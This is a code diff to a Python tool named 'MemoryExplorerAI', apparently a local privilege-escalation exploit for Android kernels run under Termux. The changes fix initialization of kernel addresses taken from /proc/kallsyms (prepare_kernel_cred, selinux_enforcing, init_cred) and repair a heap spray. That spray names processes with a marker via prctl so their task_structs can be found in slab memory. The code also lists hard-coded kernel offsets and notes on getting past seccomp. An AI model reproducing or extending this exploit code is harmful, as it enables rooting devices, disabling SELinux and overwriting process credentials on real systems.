@@ -159,6 +159,27 @@ class MemoryExplorerAI:
         self._last_throughput_ts = 0.0
         self._last_pages_count = 0
 
+        # === v4.1: KERNEL ADDRESSES (must init BEFORE load_kallsyms) ===
+        # CRITICAL: these MUST be set BEFORE load_kallsyms() is
+        # called below, because load_kallsyms() will write to
+        # self.kernel_base / self.selinux_va / self.cred_va when
+        # it finds prepare_kernel_cred / selinux_enforcing /
+        # init_cred in /proc/kallsyms. If we don't initialize
+        # them first, the `if pkc and not self.kernel_base` line
+        # raises AttributeError and the kallsyms-derived addresses
+        # are silently lost (the parse loop succeeds but the
+        # auto-derive block throws and is caught by the try/except
+        # in __init__). The kallsyms_summary then reports
+        # "kallsyms error: ... has no attribute 'kernel_base'".
+        # Bug confirmed by smoke test: kallsyms count = 2 but
+        # kernel_base = None even though prepare_kernel_cred was
+        # in /proc/kallsyms.
+        self.kernel_base = None
+        self.selinux_va  = None
+        self.cred_va     = None
+        self.init_task_va = None
+        self.auto_mode   = True
+
         # === v4.1: KBASE SEARCH CACHE ===
         # If smart_kbase_finder() finds kbase, cache it here so
         # we don't keep re-scanning the kernel text region.
@@ -540,11 +561,11 @@ class MemoryExplorerAI:
             0x018f9038, 0x018a5038, 0x01973038, 0x01939038,
             0x019f1038, 0x01a3b038, 0x01a6d038, 0x01a9f038,
         ]
-        self.kernel_base = None
-        self.selinux_va  = None
-        self.cred_va     = None
-        self.init_task_va = None  # set by load_kallsyms if visible
-        self.auto_mode   = True    # pressing E auto-runs full pipeline
+        # NOTE: self.kernel_base / self.selinux_va / self.cred_va /
+        # self.init_task_va / self.auto_mode are initialized at
+        # the TOP of __init__ so load_kallsyms() can populate them
+        # without AttributeError. Do not re-initialize here.
+
         # === SPRAY TECHNIQUE TOGGLE ===
         # setxattr is unreliable on Termux because of seccomp filters —
         # raw syscall(188) triggers SIGSYS and kills the process, and
@@ -3127,17 +3148,42 @@ class MemoryExplorerAI:
         with os.killpg(). This is more reliable than per-PID
         kill because the spray might spawn helper children.
         Returns Popen object.
+
+        v4.1 CRITICAL FIX: the comm (visible in /proc/[pid]/comm
+        and stored in task_struct->comm) must equal `name` so the
+        scanner can find our sprayed task_structs. Previous
+        version used `sh -c "exec -a $name sleep 3600"` and
+        called prctl(PR_SET_NAME) in preexec_fn, but the
+        `sleep` binary's main() calls prctl(PR_SET_NAME, "sleep")
+        during its own startup, OVERWRITING our marker. The end
+        result: every spray process has comm="sleep" instead of
+        "KETO0001" → the scanner never matches → matches=0.
+
+        Fix: spawn a Python interpreter that does the prctl
+        AFTER Python's own startup (Python 3 sets its comm to
+        "python3" during interpreter init). The first -c statement
+        overrides it back to `name`. Then time.sleep keeps the
+        process alive long enough to land in slab. Also pass the
+        comm name in argv[0] (via Python -X style) so even tools
+        that read /proc/[pid]/cmdline see the marker.
         """
         import subprocess as _sp
         try:
-            # Use start_new_session=True to put child in new
-            # process group. Then we can killpg(pgrp, SIGKILL).
+            # Python child that sets comm to `name` AFTER interpreter
+            # startup, then sleeps. The prctl in preexec_fn would be
+            # overwritten by Python's init; the prctl inside the
+            # child Python -c runs AFTER the init.
+            helper = (
+                "import ctypes,time;"
+                "libc=ctypes.CDLL(None);"
+                f"libc.prctl(15,{name!r}.encode(),0,0,0);"
+                "time.sleep(3600)"
+            )
             p = _sp.Popen(
-                ["sh", "-c", f"exec -a {name} sleep 3600"],
+                ["python3", "-c", helper],
                 stdout=_sp.DEVNULL,
                 stderr=_sp.DEVNULL,
                 start_new_session=True,  # new pgrp
-                preexec_fn=lambda n=name: self._set_comm(n),
             )
             return p
         except Exception:
